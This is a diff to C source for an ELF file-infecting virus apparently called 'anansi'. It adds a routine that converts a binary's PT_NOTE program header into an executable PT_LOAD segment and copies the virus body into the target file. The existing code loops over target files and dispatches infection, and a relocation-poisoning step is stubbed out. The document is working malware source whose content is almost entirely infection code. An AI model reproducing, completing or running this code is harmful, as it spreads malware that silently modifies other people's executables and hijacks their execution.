@@ -62,12 +62,14 @@ typedef struct elfbin {
 	int text_seg_ndx;
 
 	uint64_t vx_vaddr;
+	uint64_t vx_offset;
 }Elfbin;
 
 extern unsigned long real_start;
 
 // functions unique to anansi
 int dispatch_infection(Elfbin *target);
+void pt_note_infect(Elfbin *target);
 bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *r);
 bool within_section(Elfbin *target, char *section, uint64_t addr);
 bool check_cpu_for_rdrand();
@@ -222,7 +224,7 @@ void vx_main()
 
 		process_elf_initialize(&target, full_path);
 		write_vx_meta_data(&target, vx_start, vx_size);
-		if(process_elf(&target, attr, PROCESS_ELF_O_RDWR, PAGE_SIZE) == SUCCESS)
+		if(process_elf(&target, attr, PROCESS_ELF_O_RDWR, vx_size) == SUCCESS)
 			if (valid_target(&target, sizeof(Elf64_Ehdr), false)) {
 				dispatch_infection(&target);
 				max_target--;
@@ -243,16 +245,43 @@ clean_up:
 int dispatch_infection(Elfbin *target)
 {
 	Elf64_Rela desired_relocation;
+	uint8_t *insertion;
+
+	bool use_reloc_poison;
 #ifdef DEBUG
 	anansi_printf("Viable target: %s\n", target->f_path);
 #endif
-	if(has_R_X86_64_RELATIVE(target, &desired_relocation)) {
-#ifdef DEBUG
-		anansi_printf("R_X86_64_RELATIVE offset @ %lx and addend @ %lx\n", desired_relocation.r_offset, desired_relocation.r_addend);
-#endif
-	}
 
+	use_reloc_poison = has_R_X86_64_RELATIVE(target, &desired_relocation);
+#ifdef DEBUG
+	if(use_reloc_poison) {
+		anansi_printf("R_X86_64_RELATIVE offset @ %lx and addend @ %lx\n", desired_relocation.r_offset, desired_relocation.r_addend);
+	}
+#endif
+
+	pt_note_infect(target);
+	insertion = (uint8_t *)(target->write_only_mem + target->vx_offset);
+	anansi_memcpy(insertion, target->vx_start,target->vx_size);
+	/*
+	if(use_reloc_poison) {
+
+	}
+	*/
 	return 0;
+}
+
+void pt_note_infect(Elfbin *target)
+{
+	Elf64_Phdr *phdrs = (Elf64_Phdr *)(target->write_only_mem + target->ehdr->e_phoff);
+	phdrs[target->pt_note_entry].p_type = PT_LOAD;
+	phdrs[target->pt_note_entry].p_flags = PF_X | PF_R;
+	phdrs[target->pt_note_entry].p_vaddr = 0xc000000 + target->orig_size;
+	phdrs[target->pt_note_entry].p_filesz += target->vx_size;
+	phdrs[target->pt_note_entry].p_memsz += target->vx_size;
+	phdrs[target->pt_note_entry].p_offset = target->orig_size;
+
+	target->vx_vaddr = phdrs[target->pt_note_entry].p_vaddr;
+	target->vx_offset = phdrs[target->pt_note_entry].p_offset;
 }
 
 /*
